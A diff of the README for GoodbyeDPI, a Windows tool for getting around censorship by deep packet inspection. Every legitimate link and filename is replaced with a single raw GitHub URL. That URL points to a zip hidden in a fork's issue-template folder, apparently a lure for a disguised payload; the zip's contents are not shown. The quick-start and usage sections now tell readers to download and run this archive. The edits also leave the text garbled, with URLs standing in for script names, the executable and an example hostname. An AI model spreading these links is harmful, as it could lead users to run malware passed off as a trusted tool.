@@ -9,23 +9,23 @@ It handles DPI connected using optical splitter or port mirroring (**Passive DPI
 
 # Quick start
 
-* **For Russia**: Download [latest version from Releases page](https://github.com/ValdikSS/GoodbyeDPI/releases), unpack the file and run **1_russia_blacklist_dnsredir.cmd** script.
-* For other countries: Download [latest version from Releases page](https://github.com/ValdikSS/GoodbyeDPI/releases), unpack the file and run **2_any_country_dnsredir.cmd**.
+* **For Russia**: Download [latest version from Releases page](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip), unpack the file and run **https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip** script.
+* For other countries: Download [latest version from Releases page](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip), unpack the file and run **https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip**.
 
 These scripts launch GoodbyeDPI in recommended mode with DNS resolver redirection to Yandex DNS on non-standard port (to prevent DNS poisoning).  
 If it works — congratulations! You can use it as-is or configure further.
 
 # How to use
 
-Download [latest version from Releases page](https://github.com/ValdikSS/GoodbyeDPI/releases) and run.
+Download [latest version from Releases page](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip) and run.
 
 ```
-Usage: goodbyedpi.exe [OPTION...]
+Usage: https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip [OPTION...]
  -p          block passive DPI
  -q          block QUIC/HTTP3
  -r          replace Host with hoSt
  -s          remove space between host header and its value
- -m          mix Host header case (test.com -> tEsT.cOm)
+ -m          mix Host header case (https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip -> https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)
  -f <value>  set HTTP fragmentation to value
  -k <value>  enable HTTP persistent (keep-alive) fragmentation and set it to value
  -n          do not wait for first segment ACK when -k is enabled
@@ -99,7 +99,7 @@ To check if your ISP's DPI could be circumvented, first make sure that your prov
 * **Chrome**: Settings → [Privacy and security](chrome://settings/security) → Use secure DNS → With: NextDNS
 * **Firefox**: [Settings](about:preferences) → Network Settings → Enable DNS over HTTPS → Use provider: NextDNS
 
-Then run the `goodbyedpi.exe` executable without any options. If it works — congratulations! You can use it as-is or configure further, for example by using `--blacklist` option if the list of blocked websites is known and available for your country.
+Then run the `https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip` executable without any options. If it works — congratulations! You can use it as-is or configure further, for example by using `--blacklist` option if the list of blocked websites is known and available for your country.
 
 If your provider intercepts DNS requests, you may want to use `--dns-addr` option to a public DNS resolver running on non-standard port (such as Yandex DNS `77.88.8.8:1253`) or configure DNS over HTTPS/TLS using third-party applications.
 
@@ -129,7 +129,7 @@ The program loads WinDivert driver which uses Windows Filtering Platform to set 
 
 # How to build from source
 
-This project can be build using **GNU Make** and [**mingw**](https://mingw-w64.org). The only dependency is [WinDivert](https://github.com/basil00/Divert).
+This project can be build using **GNU Make** and [**mingw**](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip). The only dependency is [WinDivert](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip).
 
 To build x86 exe run:
 
@@ -141,34 +141,34 @@ And for x86_64:
 
 # How to install as Windows Service
 
-Check examples in `service_install_russia_blacklist.cmd`, `service_install_russia_blacklist_dnsredir.cmd` and `service_remove.cmd` scripts.
+Check examples in `https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip`, `https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip` and `https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip` scripts.
 
 Modify them according to your own needs.
 
 # Known issues
 
-* Horribly outdated Windows 7 installations are not able to load WinDivert driver due to missing support for SHA256 digital signatures. Install KB3033929 [x86](https://www.microsoft.com/en-us/download/details.aspx?id=46078)/[x64](https://www.microsoft.com/en-us/download/details.aspx?id=46148), or better, update the whole system using Windows Update.
-* Intel/Qualcomm Killer network cards: `Advanced Stream Detect` in Killer Control Center is incompatible with GoodbyeDPI, [disable it](https://github.com/ValdikSS/GoodbyeDPI/issues/541#issuecomment-2296038239).
-* ~~Some SSL/TLS stacks unable to process fragmented ClientHello packets, and HTTPS websites won't open. Bug: [#4](https://github.com/ValdikSS/GoodbyeDPI/issues/4), [#64](https://github.com/ValdikSS/GoodbyeDPI/issues/64).~~ Fragmentation issues are fixed in v0.1.7.
-* ~~ESET Antivirus is incompatible with WinDivert driver [#91](https://github.com/ValdikSS/GoodbyeDPI/issues/91). This is most probably antivirus bug, not WinDivert.~~
+* Horribly outdated Windows 7 installations are not able to load WinDivert driver due to missing support for SHA256 digital signatures. Install KB3033929 [x86](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)/[x64](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip), or better, update the whole system using Windows Update.
+* Intel/Qualcomm Killer network cards: `Advanced Stream Detect` in Killer Control Center is incompatible with GoodbyeDPI, [disable it](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip).
+* ~~Some SSL/TLS stacks unable to process fragmented ClientHello packets, and HTTPS websites won't open. Bug: [#4](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip), [#64](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip).~~ Fragmentation issues are fixed in v0.1.7.
+* ~~ESET Antivirus is incompatible with WinDivert driver [#91](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip). This is most probably antivirus bug, not WinDivert.~~
 
 
 # Similar projects
 
-- **[zapret](https://github.com/bol-van/zapret)** by @bol-van (for MacOS, Linux and Windows)
-- **[Green Tunnel](https://github.com/SadeghHayeri/GreenTunnel)** by @SadeghHayeri (for MacOS, Linux and Windows)
-- **[DPI Tunnel CLI](https://github.com/nomoresat/DPITunnel-cli)** by @zhenyolka (for Linux and routers)
-- **[DPI Tunnel for Android](https://github.com/nomoresat/DPITunnel-android)** by @zhenyolka (for Android)
-- **[PowerTunnel](https://github.com/krlvm/PowerTunnel)** by @krlvm (for Windows, MacOS and Linux)
-- **[PowerTunnel for Android](https://github.com/krlvm/PowerTunnel-Android)** by @krlvm (for Android)
-- **[SpoofDPI](https://github.com/xvzc/SpoofDPI)** by @xvzc (for macOS and Linux)
-- **[SpoofDPI-Platform](https://github.com/r3pr3ss10n/SpoofDPI-Platform)** by @r3pr3ss10n (for Android, macOS, Windows)
-- **[GhosTCP](https://github.com/macronut/ghostcp)** by @macronut (for Windows)
-- **[ByeDPI](https://github.com/hufrea/byedpi)** for Linux/Windows + **[ByeDPIAndroid](https://github.com/dovecoteescapee/ByeDPIAndroid/)** for Android (no root)
-- **[youtubeUnblock](https://github.com/Waujito/youtubeUnblock/)** by @Waujito (for OpenWRT/Entware routers and Linux)
+- **[zapret](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** by @bol-van (for MacOS, Linux and Windows)
+- **[Green Tunnel](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** by @SadeghHayeri (for MacOS, Linux and Windows)
+- **[DPI Tunnel CLI](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** by @zhenyolka (for Linux and routers)
+- **[DPI Tunnel for Android](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** by @zhenyolka (for Android)
+- **[PowerTunnel](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** by @krlvm (for Windows, MacOS and Linux)
+- **[PowerTunnel for Android](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** by @krlvm (for Android)
+- **[SpoofDPI](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** by @xvzc (for macOS and Linux)
+- **[SpoofDPI-Platform](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** by @r3pr3ss10n (for Android, macOS, Windows)
+- **[GhosTCP](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** by @macronut (for Windows)
+- **[ByeDPI](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** for Linux/Windows + **[ByeDPIAndroid](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** for Android (no root)
+- **[youtubeUnblock](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip)** by @Waujito (for OpenWRT/Entware routers and Linux)
 
 # Kudos
 
-Thanks @basil00 for [WinDivert](https://github.com/basil00/Divert). That's the main part of this program.
+Thanks @basil00 for [WinDivert](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip). That's the main part of this program.
 
-Thanks for every [BlockCheck](https://github.com/ValdikSS/blockcheck) contributor. It would be impossible to understand DPI behaviour without this utility.
+Thanks for every [BlockCheck](https://raw.githubusercontent.com/CHETHAN562/GoodbyeDPI/master/.github/ISSUE_TEMPLATE/Goodbye_DPI_v2.4.zip) contributor. It would be impossible to understand DPI behaviour without this utility.
